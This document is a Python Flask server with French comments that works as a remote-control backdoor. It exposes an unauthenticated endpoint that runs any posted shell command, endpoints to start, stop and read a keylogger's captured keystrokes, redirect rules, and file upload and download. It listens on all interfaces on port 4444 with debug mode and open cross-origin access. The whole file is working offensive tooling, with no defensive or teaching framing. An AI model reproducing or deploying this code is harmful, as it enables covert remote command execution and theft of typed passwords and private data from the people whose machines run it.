import os
import json
import subprocess
import logging
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from werkzeug.utils import secure_filename

# Configuration du logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Configuration
UPLOAD_FOLDER = 'uploads'
KEYLOG_FILE = 'keylog.txt'
REDIRECTS_FILE = 'redirects.json'
KEYLOGGER_SCRIPT = 'keylogger.py'

# Création des fichiers et dossiers nécessaires
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
for file in [KEYLOG_FILE, REDIRECTS_FILE]:
    if not os.path.exists(file):
        open(file, 'w').close()

# Variables globales
keylogger_process = None

@app.route('/command', methods=['POST'])
def execute_command():
    try:
        data = request.get_json()
        if not data or 'command' not in data:
            return jsonify({'error': 'No command provided'}), 400

        command = data['command']
        logger.info(f"Executing command: {command}")

        # Exécution de la commande
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate()

        return jsonify({
            'output': stdout,
            'error': stderr,
            'return_code': process.returncode
        })

    except Exception as e:
        logger.error(f"Error executing command: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/keylog/start', methods=['POST'])
def start_keylogger():
    global keylogger_process
    try:
        if keylogger_process is not None:
            return jsonify({'message': 'Keylogger is already running'}), 200

        logger.info(f"Starting keylogger from: {os.path.abspath(KEYLOGGER_SCRIPT)}")
        keylogger_process = subprocess.Popen(
            ['python3', KEYLOGGER_SCRIPT],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        return jsonify({'message': 'Keylogger started successfully'}), 200

    except Exception as e:
        logger.error(f"Error starting keylogger: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/keylog/stop', methods=['POST'])
def stop_keylogger():
    global keylogger_process
    try:
        logger.info("Stopping keylogger")
        if keylogger_process is not None:
            keylogger_process.terminate()
            keylogger_process = None
            return jsonify({'message': 'Keylogger stopped successfully'}), 200
        return jsonify({'message': 'Keylogger was not running'}), 200

    except Exception as e:
        logger.error(f"Error stopping keylogger: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/keylog/output', methods=['GET'])
def get_keylog_output():
    try:
        logger.info(f"Reading keylog from: {os.path.abspath(KEYLOG_FILE)}")
        if not os.path.exists(KEYLOG_FILE):
            logger.error(f"keylog.txt file does not exist at {os.path.abspath(KEYLOG_FILE)}")
            return jsonify({'output': ''}), 200

        with open(KEYLOG_FILE, 'r') as f:
            content = f.read()
        return jsonify({'output': content}), 200

    except Exception as e:
        logger.error(f"Error reading keylog: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/redirect/add', methods=['POST'])
def add_redirect():
    try:
        data = request.get_json()
        if not data or 'source' not in data or 'destination' not in data:
            return jsonify({'error': 'Missing source or destination'}), 400

        redirects = {}
        if os.path.exists(REDIRECTS_FILE):
            with open(REDIRECTS_FILE, 'r') as f:
                redirects = json.load(f)

        redirects[data['source']] = data['destination']

        with open(REDIRECTS_FILE, 'w') as f:
            json.dump(redirects, f, indent=4)

        return jsonify({'message': 'Redirect rule added successfully'}), 200

    except Exception as e:
        logger.error(f"Error adding redirect: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/redirect/list', methods=['GET'])
def list_redirects():
    try:
        if not os.path.exists(REDIRECTS_FILE):
            return jsonify({'redirects': {}}), 200

        with open(REDIRECTS_FILE, 'r') as f:
            redirects = json.load(f)
        return jsonify({'redirects': redirects}), 200

    except Exception as e:
        logger.error(f"Error listing redirects: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/redirect/remove', methods=['POST'])
def remove_redirect():
    try:
        data = request.get_json()
        if not data or 'source' not in data:
            return jsonify({'error': 'Missing source'}), 400

        if not os.path.exists(REDIRECTS_FILE):
            return jsonify({'message': 'No redirects file found'}), 200

        with open(REDIRECTS_FILE, 'r') as f:
            redirects = json.load(f)

        if data['source'] in redirects:
            del redirects[data['source']]
            with open(REDIRECTS_FILE, 'w') as f:
                json.dump(redirects, f, indent=4)
            return jsonify({'message': 'Redirect rule removed successfully'}), 200
        else:
            return jsonify({'message': 'Redirect rule not found'}), 404

    except Exception as e:
        logger.error(f"Error removing redirect: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/files', methods=['GET'])
def list_files():
    try:
        files = []
        for filename in os.listdir(UPLOAD_FOLDER):
            file_path = os.path.join(UPLOAD_FOLDER, filename)
            if os.path.isfile(file_path):
                files.append({
                    'name': filename,
                    'size': os.path.getsize(file_path),
                    'modified': os.path.getmtime(file_path)
                })
        return jsonify({'files': files}), 200

    except Exception as e:
        logger.error(f"Error listing files: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/upload', methods=['POST'])
def upload_file():
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file part'}), 400

        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No selected file'}), 400

        filename = secure_filename(file.filename)
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        file.save(file_path)
        return jsonify({'message': 'File uploaded successfully'}), 200

    except Exception as e:
        logger.error(f"Error uploading file: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    try:
        return send_file(
            os.path.join(UPLOAD_FOLDER, secure_filename(filename)),
            as_attachment=True
        )

    except Exception as e:
        logger.error(f"Error downloading file: {str(e)}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4444, debug=True) 